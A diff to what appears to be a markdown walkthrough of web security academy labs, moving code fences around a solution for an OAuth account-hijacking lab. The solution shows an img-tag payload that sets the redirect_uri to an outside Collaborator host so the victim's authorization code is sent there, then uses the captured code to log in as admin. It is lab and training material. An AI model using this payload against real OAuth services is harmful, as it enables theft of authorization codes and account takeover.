@@ -355,14 +355,15 @@ Solution:
 1. Prepare the content of exploit server:
 
 
+```
     <img src="https://oauth-0ac200710489f4088294a907025b0040.oauth-server.net/auth?client_id=ocyb4qnsgvstf8de8e07i&redirect_uri=https://xbcl3q90bijx8paegc08b6i6yx4osig7.oastify.com&response_type=code&scope=openid%20profile%20email">
+```
 
 2. Notice the OAuth2 code sent to Collaborator
 
 3. Log in as admin:
 
     https://0a6200db0411f49482bdab9d00270000.web-security-academy.net/oauth-callback?code=O7aYu_i8eMVV6CcCQwb0-SDTRLPQ273XIKCmYiTgvrs
-```
 
 ## XML external entity (XXE) injection
 
